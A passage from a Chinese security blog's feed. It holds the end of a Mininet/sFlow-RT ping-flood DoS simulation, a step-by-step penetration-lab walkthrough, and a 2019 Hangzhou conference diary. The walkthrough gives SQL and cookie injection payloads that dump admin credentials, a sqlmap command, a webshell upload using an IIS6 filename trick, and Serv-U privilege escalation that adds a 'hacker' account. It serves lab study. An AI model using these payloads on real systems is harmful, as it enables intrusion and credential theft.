mininet</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mn</span><br></pre></td></tr></table></figure><p>进入到<code>mininet</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mininet&gt; h1 ping -f h2</span><br></pre></td></tr></table></figure><h3 id="第三个终端"><a href="#第三个终端" class="headerlink" title="第三个终端"></a>第三个终端</h3><p>再打开第三个终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ghjkl<span class="comment"># ifconfig ens33 up</span></span><br><span class="line">root@ubuntu:/home/ghjkl<span class="comment"># ovs-vsctl add-port s1 ens33</span></span><br><span class="line">root@ubuntu:/home/ghjkl<span class="comment"># ifconfig s1 10.0.0.3 netmask 255.255.255.0</span></span><br><span class="line">root@ubuntu:/home/ghjkl<span class="comment"># route add default gw 10.0.0.1</span></span><br><span class="line">root@ubuntu:/home/ghjkl<span class="comment"># sudo ovs-vsctl -- --id=@sflow create sFlow agent=s1 target=\"10.0.0.128:6343\"  header=128  sampling=64 polling=1 -- set bridge s1 sflow=@sflow</span></span><br><span class="line">root@ubuntu:/home/ghjkl<span class="comment"># sudo ovs-vsctl list sflow</span></span><br></pre></td></tr></table></figure><p>上面的<code>10.0.0.128</code>是本虚拟机的<code>ip</code></p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566982111291.png" alt="1566982111291"></p><p>打开网页</p><p><a href="http://127.0.0.1:8008/metric/10.0.0.3/11.ifinoctets/html" target="_blank" rel="noopener">http://127.0.0.1:8008/metric/10.0.0.3/11.ifinoctets/html</a></p><p>就会观察到流量波动</p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566972815966.png" alt="1566972815966"></p><p>这个图有点问题，不知道为啥，之前拍好的快照是下面这样的</p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566999429927.png" alt="1566999429927"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲来无趣，有学弟问我，能不能模拟dos攻击，我#￥%……&amp;amp;*（,然后想了想，搜了搜，还真可以模拟，通过ping模拟dos攻击。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="流量分析" scheme="https://jianghuxia.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>渗透学习_Test_03</title>
    <link href="https://jianghuxia.github.io/2019/05/13/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-Test-03/"/>
    <id>https://jianghuxia.github.io/2019/05/13/渗透学习-Test-03/</id>
    <published>2019-05-13T01:11:19.000Z</published>
    <updated>2019-09-02T09:07:18.669Z</updated>
    
    <content type="html"><![CDATA[<p>渗透学习_Test_03，环境朋友给的，自己本地搭的，仅供学习参考</p><a id="more"></a> <h4 id="关卡一：获取020002-zguo0yrd-wlz-com后台登陆密码-sql注入"><a href="#关卡一：获取020002-zguo0yrd-wlz-com后台登陆密码-sql注入" class="headerlink" title="关卡一：获取020002-zguo0yrd.wlz.com后台登陆密码(sql注入)"></a>关卡一：获取020002-zguo0yrd.wlz.com后台登陆密码(sql注入)</h4><p>手工注入<code>http://020002-zguo0yrd.wlz.com/article.php?id=-5 union select 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</code></p><p><img src="/2019/05/13/渗透学习-Test-03/1563238326637.png" alt="1563238326637"></p><p>爆出当前数据库名<code>picobbstestphp</code>，接着爆出当前所有数据表名</p><p><code>http://020002-zguo0yrd.wlz.com/article.php?id=-5 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.columns where table_schema = database()</code> </p><p><img src="/2019/05/13/渗透学习-Test-03/1563238351768.png" alt="1563238351768"><code>yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoulistdata,yzsoumember,yzsoumember,yzsoumember,yzsoumember,yzsoumember,yzsoumember,yzsoumember,yzsou</code></p><p>许多的重复，我们需要找到相应的后台登陆密码，多次查找各表中的列，发现存在于<code>yzsoumember</code>表中</p><p><code>http://020002-zguo0yrd.wlz.com/article.php?id=-5 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.columns where table_name= 0x797A736F756D656D626572</code></p><p>爆出表的各个列名</p><p><img src="/2019/05/13/渗透学习-Test-03/1563238772426.png" alt="1563238772426"></p><p><code>id,username,password,email,password_question,password_answer,power,point,writecount,regdate,thisdate,realname,sex,birthday,handtel,hometel,company,address,zip,qq,sign,topcount,topdate,other1,other2,other3,other4</code></p><p>知道列名，直接查询即可</p><p><code>http://020002-zguo0yrd.wlz.com/article.php?id=-5 union select 1,group_concat(id,0x23,username,0x23,password,0x23,email,0x23,password_question,password_answer,power,point,writecount,regdate,thisdate,realname,sex,birthday,handtel,hometel,company,address,zip,qq,sign,topcount,topdate,other1,other2,other3,other4),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from yzsoumember</code></p><p>查询出我们想要的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1#admin#xu2416#agrivertest@163.com#7176manager1000602011/11/11 16:44:592018/12/17 17:30:53pico先生 13625853214picopico361000172.16.156.63,2#jianghu#jianghu#jianghu@qq.com#1jianghu1002019/07/15 10:15:292019/07/15 10:15:2912345678192.168.110.129</span><br></pre></td></tr></table></figure><h4 id="关卡二：获取网站根目录下包含关键字为“关卡二”的文本文件内容。（修改文件或修改配置，然后上传小马）"><a href="#关卡二：获取网站根目录下包含关键字为“关卡二”的文本文件内容。（修改文件或修改配置，然后上传小马）" class="headerlink" title="关卡二：获取网站根目录下包含关键字为“关卡二”的文本文件内容。（修改文件或修改配置，然后上传小马）"></a>关卡二：获取网站根目录下包含关键字为“关卡二”的文本文件内容。（修改文件或修改配置，然后上传小马）</h4><p>用户名<code>admin</code>密码<code>xu2416</code>登录后台，御剑爆破后台<code>http://020002-zguo0yrd.wlz.com/admin_set.php</code><br>修改系统参数，允许上传<code>php</code>文件</p><p><img src="/2019/05/13/渗透学习-Test-03/批注 2019-07-15 110727.png" alt="批注 2019-07-15 110727"></p><p>利用编辑器上传<code>php</code>文件，得到路径<code>data/upload/admin_20190715110059_1.php</code></p><p><img src="/2019/05/13/渗透学习-Test-03/批注 2019-07-15 110217.png" alt="批注 2019-07-15 110217"></p><p>菜刀连接</p><p><img src="/2019/05/13/渗透学习-Test-03/1563239613866.png" alt="1563239613866"></p><p>打开关卡二，得到<code>e54e4eb2226514e8e116c203fbefc4e2</code></p><h4 id="关卡三：获取网站旁站的域名（nslookup-qt-ptr-192-168-110-131）"><a href="#关卡三：获取网站旁站的域名（nslookup-qt-ptr-192-168-110-131）" class="headerlink" title="关卡三：获取网站旁站的域名（nslookup -qt=ptr 192.168.110.131）"></a>关卡三：获取网站旁站的域名（nslookup -qt=ptr 192.168.110.131）</h4><p>dns服务器未配置，故无法查看旁站域名</p><h4 id="关卡四：获取302-lostcity-com旁站后台管理员明文登录密码。（cookies注入，类型asp）"><a href="#关卡四：获取302-lostcity-com旁站后台管理员明文登录密码。（cookies注入，类型asp）" class="headerlink" title="关卡四：获取302.lostcity.com旁站后台管理员明文登录密码。（cookies注入，类型asp）"></a>关卡四：获取302.lostcity.com旁站后台管理员明文登录密码。（cookies注入，类型asp）</h4><p><code>cookie</code>注入原理：<code>https://www.cnblogs.com/sun-sunshine123/p/6861677.html</code><br>要进行<code>cookie</code>注入，首先就要修改<code>cookie</code>，需要使用<code>Javascript</code>语言。<br><code>cookie</code>注入的形成有两个必要条件：<br>条件1是：程序对<code>get</code>和<code>post</code>方式提交的数据进行了过滤，但未对<code>cookie</code>提交的数据库进行过滤。<br>条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接<code>request(&quot;xxx&quot;)</code>的方式，未指明使用<code>request</code>对象的具体方法进行获取。</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_11-38-41.png" alt="Snipaste_2019-07-15_11-38-41"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;3&quot;));</span><br><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;3 and 1=1&quot;));</span><br><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;3 order by 3&quot;));</span><br></pre></td></tr></table></figure><p><img src="/2019/05/13/渗透学习-Test-03/1563240473183.png" alt="1563240473183"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=3 and exists(select * from admin)</span><br><span class="line">id=3 and exists(select id,username,password from admin)</span><br><span class="line">id=3 and 1=2 union select 1,2,username from admin//ad_pico//只有第三个字段在网页中有回显</span><br><span class="line">id=3 and 1=2 union select 1,2,password from admin //8bcf0f6d327af695-------&gt;aj7562</span><br></pre></td></tr></table></figure><p><img src="/2019/05/13/渗透学习-Test-03/1563240375275.png" alt="1563240375275"></p><p><img src="/2019/05/13/渗透学习-Test-03/1563240398716.png" alt="1563240398716"></p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_14-33-13.png" alt="Snipaste_2019-07-15_14-33-13"></p><p><code>sqlmap</code>也可以自己跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -2 sqlmap.py -u http://120002-gznu9cn4.wlz.com/About.asp --cookie id=3 --level 2 --table</span><br></pre></td></tr></table></figure><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_14-41-21.png" alt="Snipaste_2019-07-15_14-41-21"></p><p>#### </p><h4 id="关卡五：获取302-lostcity-com旁站根目录下文件名包含“关卡五”关键字的文本文件内容-上传webshell-asp-123-jpg——IIS6-0文件名解析漏洞"><a href="#关卡五：获取302-lostcity-com旁站根目录下文件名包含“关卡五”关键字的文本文件内容-上传webshell-asp-123-jpg——IIS6-0文件名解析漏洞" class="headerlink" title="关卡五：获取302.lostcity.com旁站根目录下文件名包含“关卡五”关键字的文本文件内容(上传webshell.asp;123.jpg——IIS6.0文件名解析漏洞)"></a>关卡五：获取302.lostcity.com旁站根目录下文件名包含“关卡五”关键字的文本文件内容(上传webshell.asp;123.jpg——IIS6.0文件名解析漏洞)</h4><p>登录后台，如下</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_14-40-04.png" alt="Snipaste_2019-07-15_14-40-04"></p><p>测试之后，直接上传<code>webshell.asp;123.jpg</code>,<code>BrupSuite</code>抓包获取路径</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_14-49-11.png" alt="Snipaste_2019-07-15_14-49-11"></p><p>菜刀连接</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_14-51-07.png" alt="Snipaste_2019-07-15_14-51-07"></p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_14-52-18.png" alt="Snipaste_2019-07-15_14-52-18"></p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_14-53-03.png" alt="Snipaste_2019-07-15_14-53-03"></p><p>获得关卡五的答案<code>a526bc3683143c36d6bcf2c7b53c7b64</code></p><h4 id="关卡六：获取目标服务器ftp的明文密码（大马查看servUDaemon-ini配置信息，MD5拆解ftp账号my的密码）"><a href="#关卡六：获取目标服务器ftp的明文密码（大马查看servUDaemon-ini配置信息，MD5拆解ftp账号my的密码）" class="headerlink" title="关卡六：获取目标服务器ftp的明文密码（大马查看servUDaemon.ini配置信息，MD5拆解ftp账号my的密码）"></a>关卡六：获取目标服务器ftp的明文密码（大马查看servUDaemon.ini配置信息，MD5拆解ftp账号my的密码）</h4><p>然后上传大马，寻找<code>servUDaemon.ini</code>，获取<code>ftp</code>配置信息</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_15-10-01.png" alt="Snipaste_2019-07-15_15-10-01"></p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_15-07-29.png" alt="Snipaste_2019-07-15_15-07-29"></p><p><code>my--------a13b</code></p><h4 id="关卡七：获取目标服务器c盘根目录文件名包含关键字“关卡七”中的文本文件内容。（大马打包下载Serv-U目录所有文件，本地模拟建立高权限用户，再由已知的ftp普通用户上传模拟完成后的servUDaemon-ini至受害主机Serv-U目录下，紧接着ftp提权，最后远程3389访问）"><a href="#关卡七：获取目标服务器c盘根目录文件名包含关键字“关卡七”中的文本文件内容。（大马打包下载Serv-U目录所有文件，本地模拟建立高权限用户，再由已知的ftp普通用户上传模拟完成后的servUDaemon-ini至受害主机Serv-U目录下，紧接着ftp提权，最后远程3389访问）" class="headerlink" title="关卡七：获取目标服务器c盘根目录文件名包含关键字“关卡七”中的文本文件内容。（大马打包下载Serv-U目录所有文件，本地模拟建立高权限用户，再由已知的ftp普通用户上传模拟完成后的servUDaemon.ini至受害主机Serv-U目录下，紧接着ftp提权，最后远程3389访问）"></a>关卡七：获取目标服务器c盘根目录文件名包含关键字“关卡七”中的文本文件内容。（大马打包下载Serv-U目录所有文件，本地模拟建立高权限用户，再由已知的ftp普通用户上传模拟完成后的servUDaemon.ini至受害主机Serv-U目录下，紧接着ftp提权，最后远程3389访问）</h4><p>打包目标<code>serv-u</code>目录到本地，将配置文件<code>servUDaemon.ini</code>中的<code>LocalSetupPassword=rdE167B33ADCD684039085ADA6D76D315D</code>删除，然后运行<code>servUAdmin.exe</code>创建一个具备执行权限的账户<code>jianghu</code>，密码<code>jianghu</code><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_16-00-43.png" alt="Snipaste_2019-07-15_16-00-43"></p><p>再查看下<code>servUDaemon.ini</code>中的配置信息</p><p><img src="/2019/05/13/渗透学习-Test-03/1563242075326.png" alt="1563242075326"></p><p>感兴趣的解密下，得到的密码也就是<code>jianghu</code></p><p><img src="/2019/05/13/渗透学习-Test-03/1563242225756.png" alt="1563242225756"></p><p>然后命令行下<code>ftp 192.168.126.131</code>，账号：<code>my</code>，密码：<code>a13b</code>，将添加<code>jianghu</code>用户权限后的<code>servUDaemon.ini</code>上传</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_16-05-34.png" alt="Snipaste_2019-07-15_16-05-34"></p><p>上传成功后，使用<code>jianghu</code>账号登录，添加<code>hacker</code>用户</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_16-17-29.png" alt="Snipaste_2019-07-15_16-17-29"></p><p>提权执行操作成功</p><p>远程登陆，修改<code>C</code>盘下的“关卡七”的权限，即可打开</p><p><img src="/2019/05/13/渗透学习-Test-03/Snipaste_2019-07-15_16-30-28.png" alt="Snipaste_2019-07-15_16-30-28"></p><p>获得关卡七的答案<code>8584aced5f25b33953b973ce74f27445</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;渗透学习_Test_03，环境朋友给的，自己本地搭的，仅供学习参考&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透学习" scheme="https://jianghuxia.github.io/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>2019杭州之旅@2050</title>
    <link href="https://jianghuxia.github.io/2019/05/01/2019%E6%9D%AD%E5%B7%9E%E4%B9%8B%E6%97%85-2050/"/>
    <id>https://jianghuxia.github.io/2019/05/01/2019杭州之旅-2050/</id>
    <published>2019-05-01T08:42:23.000Z</published>
    <updated>2019-05-01T08:58:09.930Z</updated>
    
    <content type="html"><![CDATA[<p>2019.04.26，厦门，晴，在朝阳升起的一刻，一架飞机机翼划过亮光，带着呼啸，腾空而起，朝北掠去，而故事由此开始，……<br><a id="more"></a> </p><p>参加2050，这里先感谢阿里安全提供的入场票，使得拥有机会参加这次活动。</p><h3 id="0x01-Day"><a href="#0x01-Day" class="headerlink" title="0x01 Day"></a>0x01 Day</h3><p>凌晨4点四点赶飞机，飞机到杭州机场后，赶车一上午到酒店，路上风景不错，有淡淡的花香。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556680387956.png" alt="1556680387956"></p><p>酒店里偷偷睡了个午觉，然后睡过头了。下午14点的分享，晚到半个小时，走进团聚的地方，赶快找了个地方坐下乖乖听讲。</p><h4 id="团聚分享"><a href="#团聚分享" class="headerlink" title="团聚分享"></a>团聚分享</h4><p>晚到的久，直接从听到的讲吧。冰尘，不陌生吧，老哥介绍了下自己经历，其中许多让我感觉到大佬就是从小培养的，印象最深的就是，老哥在一次老师上课过程中演示的java序列化中跟老师较真存在漏洞可能性的心性让我佩服，还分享了若干社工知识，最简单的，通过手机号码直接支付宝搜索真实姓名（分享的时候，问了一句”大伙，谁给个手机号给我“，大伙犹豫了半天，害怕.jpg）。其实讲到了路由器，从拆开路由器，改装路由器到利用路由器进行一些迷之操作（不方便讲出来），……</p><p>接下来，一个小伙子，开始讲述了个人传奇，学安全，从开（qiao）锁开始，各种神奇的开锁工具听的迷之又迷，每套工具更是贵的鸭皮，以万为单位，开始起步（对不起，可能我来错地方了，这可能是土豪云集地吧），……</p><p>小伙子讲完后，均哥再次上台主持，提了下APT溯源（<a href="https://www.secpulse.com/archives/67152.html" target="_blank" rel="noopener">Whats APT：浅谈APT攻击</a>），讲述了一次在阿里无意的随手“操作”,发现阿里访客系统存在可以远程连接相应的保安系统服务器，打印出任意通行的访客牌凭证。后面一个大佬来了，讲了一个替某公司排查存在通过wifi方式进行内网漫游的可能性测试，具体是在接到该公司的正式授权后，寻找通过wifi入侵内网的可能点，不出其然，公司内部虽然都进行过AP隔离，但是开发员工由于安全意识欠缺，私自开wifi，甚至有些没设密码，那不好意思了,……</p><p>然后讲着讲着，讲到了钓鱼<code>wifi</code>，这又是一堆一堆的，具体过程就是类似“姜太公钓鱼，愿者上钩”的故事。</p><h4 id="Ivan"><a href="#Ivan" class="headerlink" title="Ivan"></a>Ivan</h4><p>随着一阵喧哗声，一个歪果仁朋友进来了，<strong>Ivan</strong>,这个老哥一进来，气氛开始活跃了，均哥介绍一番，已经生活在中国<code>10</code>年的一个”中国通“，中文溜溜的，关键是这老哥看起来和蔼，平易近人。随后，Ivan上台了，讲述了一些看法，这些想法令我陷入深思。</p><h5 id="为了保护那些比自己“傻”的人"><a href="#为了保护那些比自己“傻”的人" class="headerlink" title="为了保护那些比自己“傻”的人"></a>为了保护那些比自己“傻”的人</h5><p>首先，他问了一个问题，你们学习网络安全是为了什么？我那时候还自己心里想了下，为了啥，我觉得这有趣啊。随后，他讲了自己的想法，为了保护那些不了解网路安全的人，为了保护那些不会网络安全技术的人，为了保护那些比自己“傻”的人。实在话，他说出来的那一刻，我内心震撼挺大的，我从来没有听到过类似的话语，从我接触网安开始，我没有听到过除了这个想法以外的想法。我觉得这是每一个网络安全从事者（白帽子），都应该认真思考的，是兴趣嘛？或者其他？</p><h5 id="安全是一个过程"><a href="#安全是一个过程" class="headerlink" title="安全是一个过程"></a>安全是一个过程</h5><p>随后Ivan提到一个点，安全是一个过程，网络安全可以看做一个人，如何保护好这个人呢？答案不容置疑，自然是全局保护。只保护大脑行吗？只保护四肢行吗？自然不行，安全就是这样，安全是一个过程，保护环节，不是说只保护一个地方就行，而是每个阶段，每个过程都要保护。</p><h4 id="贤唐"><a href="#贤唐" class="headerlink" title="贤唐"></a>贤唐</h4><p>紧接着，阿里安全贤唐大佬来了，均哥介绍了下，才知道咱的票就是经过这位“财主”之手拿到的，感谢赞助学生票（抱紧财主.jpg）。老哥提了两个点：</p><h5 id="安全非常广泛"><a href="#安全非常广泛" class="headerlink" title="安全非常广泛"></a>安全非常广泛</h5><p>众所周知，从古代到现在，从战争到和平，从国家安全到个人安全，随处可见。关心朋友，家人，一句“注意安全”，倾尽善意，安全领域非常广泛。又如网络安全，各个领域，基本上伴随着一个物体的产生或者事件的发生，无处不在，……。而我是这样想的，的确无处不在啊，从二进制到web，从软件到硬件，从web安全到物联网安全，……,尼玛，要学的好多啊。^~_~^</p><p>然后讲完这个，大佬堆里，（均哥，冰尘等大佬）突然一阵打笑声，贤唐大佬的照片被恶意<code>wifi</code>钓鱼了，直接抓到大头照（不过别说，挺帅的）咳咳，其实是大佬堆里恶搞的啦，它们互为微信好友，wifi钓鱼抓个微信头像还不容易。接着讲下一个点</p><h5 id="安全其实就是打个信息差"><a href="#安全其实就是打个信息差" class="headerlink" title="安全其实就是打个信息差"></a>安全其实就是打个信息差</h5><p>分析了下安全，总而言之就是打了个信息差。想了想，感觉的确如此，挖个洞，手上几个<code>0day</code>的话，搞起来不算事，要是没有，如果是网络对抗，那是被按着打。资产管理等也是如此，知道的资产越多，挖洞的概率也就越高，说来说去就是信息的不对等。</p><p>然后啊，均哥再次主持，小伙伴接着分享:</p><p>其中有位被小伙伴介绍是麻省理工的朋友简单讲述<code>4G</code>、<code>5G</code>，讲述了<code>5G</code>协议的定义过程，以及目前的一些<code>5G</code>协议情况，从安全角度分析<code>4G</code>和<code>5G</code>的安全性。唯一记着比较清的，<code>5G</code>协议相对<code>4G</code>比较重要而言就是可以同时打电话和开<code>4G</code>上网了，这点我是感觉得到啦，毕竟偶尔王者荣耀，有个电话打进来，<code>emmmmmmm~~~</code>,还讲到其他七七八八的专业名词，我觉得是挺强的啦，只是听不懂，膜拜（看到没，网安不简单，这算是通信安全的范畴吧，我菜的抠<code>jiao</code>）</p><p>接着就是一位学医的小姐姐，饿，不对，是另外一位重事电网相关行业的老哥（我没有乱讲，毕竟当时候均哥像个大恶魔叫大家都上去讲讲，我啥都没说啊。另外，题外话，那位学医的小姐姐右边那个女生很好看，求介绍）。</p><p>其中印象比较深的是，电网结点并行计算和串行计算，这个那时候不是很懂，后面专门看了下相关的论文，额，不好意思，还是讲安全吧。在其中讲述过程中，均哥有讲过一次路边电箱锁没锁好，观察了一波内部有啥东西的事例，讲到有个计算机，嗯，懂了吧，控制的计算机，所以，安全这种东西最大的缺陷还是在人身上，锁记得锁好啊！后面均哥提了一些问题，电网的控制网和内部系统网是连在一起的嘛？老哥说一般情况下，大部分的设备都能进行远程控制（想了想，应该也是远程控制，不可能哪里出问题，我就去哪吧），通过专线传输一些数据（对这个专线定义没搞清楚），主控中心分布在各处。还记得，就是问，大型电线杆上有几根线，作用是啥（描述可能不是很清楚，反正是那种高高的，大大的，不是路边那种小小的电线杆），老哥说，五根，有控制线路，也还有传电线路。</p><p>大概记得就这么多了，哦对了，其中的团聚过程中，秋秋表姐上去从安全运营者的角度讲述了对白帽子和网络安全的看法，也了解了从其他角度，针对白帽子的看法。啊，另外，终于线下见到了秋秋表姐，嗯，越来越漂亮了耶。均哥主持过程中，问了很多我们不好问但又对我们帮助大的问题，爱死均哥了。</p><p>总之，团聚收获很大啊，只可意会不可言传。然后18点半左右结束了团聚，我就去楼上面参加当天2050的晚会了。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556680719306.png" alt="1556680719306"></p><p>（很多漂亮的妹子啊，流口水，跟大伙玩了一个小时，然后逛了逛，突然想入职阿里巴巴了，太美了，太有钱了。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556680354443.png" alt="1556680354443"></p><p><img src="/2019/05/01/2019杭州之旅-2050/1556680486654.png" alt="1556680486654"></p><p>走回酒店吃饭，饿死了那时候，下午参与过度团聚，太认真了，晚上快22点睡着了，好累啊）</p><h3 id="0x02-Day"><a href="#0x02-Day" class="headerlink" title="0x02 Day"></a>0x02 Day</h3><p>早上<code>05.50</code>就起来了，精神满满，发现是阴天，还有点凉。赖会床，下楼发现没早餐吃，去吃kfc，好好吃啊，然后就做公交去云栖小镇了。</p><p>今天嘛，主要是各个展台演示，贼tm好玩。过去的时候，我们defcon演示的展台还没弄好，到处转转别的展台。</p><p>其中有卫星模型</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556630931071.png" alt="1556630931071"></p><p>在旁边听了很久介绍人的讲述，牛逼啊，问了问卫星的构造及工作原理，其实这些只是为了我问“假如人在地面要控制天上的卫星，通过什么设备什么方式控制的呢？”（别瞎猜，我没有想gao卫星，别乱讲啊），然后问了半天，还是没问出个所以然，遂作罢。只知道卫星天线（就是上图黄色方体那几个白白的东西）必须时刻对着地球，否则收不到信号。以及国内一些常见卫星发射地发射不同高低轨道卫星的区别。</p><p>不远处有一架运20的模型，从小就是军迷的我自然不想错过这次机会，奈何，人实在太多了，等到中午，吃饭去了……</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556678075222.png" alt="1556678075222"></p><p>远远不止这些，还有模拟乒乓训练平台、VR游戏，还想上去露两手来着，初中生太多了；格力制造的机器人演奏乐队，飞机发动机七七八八的，……</p><p>差不多defcon那边展台弄的差不多了，然后就这样开了一个上午的锁，尝试了一遍，贼好玩；老哥们还演示了，如何通过基于特斯拉线圈盗刷银行卡的实例。这个过程中，一群伙伴互相认识，互加卫星，好友位啊，爽啊。</p><p>然后均哥到大厅中央去做安全论坛的演讲了，讲了先实例，强调安全的普遍性。</p><p>玩着玩着就快13点了，做个公交回酒店，点个外卖吃下，睡了个午觉。</p><p>下午，由于上午展台基本上对感兴趣的都问了一遍，看了下群里伙伴说我们展台那边还是一样的活动，就没过去了，想着去杭州九溪烟树，龙井村那边走走，等我搭上公交到了九溪那边，均哥说下午3点半拍合照，wc，看了看时间已经3点，肯定来不及，那就算了吧，这算是个遗憾吧。</p><p>九溪还是挺不错的，走在石头路上，阳光伴着飘絮，有种朦胧美，走了5公里吧，走到龙井村，给老爸带了几包茶叶回来。（走山路还是穿运动鞋啊，板鞋也别穿，不然脚第二天疼的很）</p><p><img src="/2019/05/01/2019杭州之旅-2050/IMG_20190427_152436.jpg" alt="IMG_20190427_152436"></p><p>晚上回酒店18点多，无聊得很，把今天想的消化了下，ipad重新梳理了下笔记，九点多睡了。</p><h3 id="0x03-Day"><a href="#0x03-Day" class="headerlink" title="0x03 Day"></a>0x03 Day</h3><p>一起床，感觉有点着凉，厦门跟杭州温差还是挺大的，算了晨跑就不去了，不然9点的论坛，来回酒店洗澡换衣服麻烦。退了房间，楼下吃kfc早点，坐公交过去了。</p><p>过去时间赶的差不多，均哥照样主持，发言了几句，就请道哥上台了。</p><h4 id="吴翰清（道哥）"><a href="#吴翰清（道哥）" class="headerlink" title="吴翰清（道哥）"></a>吴翰清（道哥）</h4><p>道哥这次主题是互联网安全的挑战与应有的协同机制。</p><h5 id="网路安全的挑战"><a href="#网路安全的挑战" class="headerlink" title="网路安全的挑战"></a>网路安全的挑战</h5><p>从最开始，安全产业的起源和发展方面论述。从计算机到软件再到互联网，介绍最早的黑客与黑色产业的兴起，分析了下我国安全厂商与安全市场，而我国网络安全产业2019年将达到600亿的规模市值（而黑产，最低预估是这个的10倍）。</p><p>紧接着，谈到基础设施（软件）对安全的影响，包括操作系统、电信运营商、云计算以及苹果app store,强调了基础设施改进有可能在一夜之间颠覆攻防之间的不对等，并且举了如下图的两个例子。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556681096126.png" alt="1556681096126"></p><p>针对勒索软件的对抗，分析了比特币和勒索病毒的结合。比特币难以溯源的特点，再加上勒索病毒，使得很难去追查病毒发起的个人或组织。想想也是，这的确是一种不对等关系，“我勒索后，反正你追查不到我”，使得罪犯逍遥法外。</p><p>其次讲了一些难解的安全挑战问题，如弱口令问题、DDOS攻击问题、像刚刚的勒索软件问题，以及常常关注的逻辑漏洞。其中，逻辑漏洞，是软件功能性带来的问题，所幸发现后可以通过技术手段解决；而其中严重损失的依旧是弱口令问题(这点我深有感悟，许多人员接受安全培训后，依旧犯类似问题)</p><p>随之讲到了开放性带来的技术的失败，两个点，一是单点技术都能解，但全局无法解；二是涉及到跨组织协同的问题尤其难解，例如网络诈骗问题，讲述了网络诈骗产业链的过程。</p><p><img src="/2019/05/01/2019杭州之旅-2050/1556689025879.png" alt="1556689025879"></p><p>之后，道哥开始讲述协同机制相关知识点。</p><h5 id="协同机制"><a href="#协同机制" class="headerlink" title="协同机制"></a>协同机制</h5><p>先讲述了下历史上的伟大协同，例如欧洲大型量子对撞机合作实验的成功、航天航空组织合作拍摄黑洞照片、流浪地球等等栗子。讲述了下，自身对于协同的尝试，讲述2011年反钓鱼联盟成立到至今的变化。再举例，讲述一个各大情报组织对于威胁情报交换与共享平台协同不易成功的原因，往往是因为协同问题，每个利益方各自获得权益不同所造成的。</p><p>互联网安全协同存在以下角色：监管者、安全公司、运营商、NGO（No<em>n-Go</em>vernmental 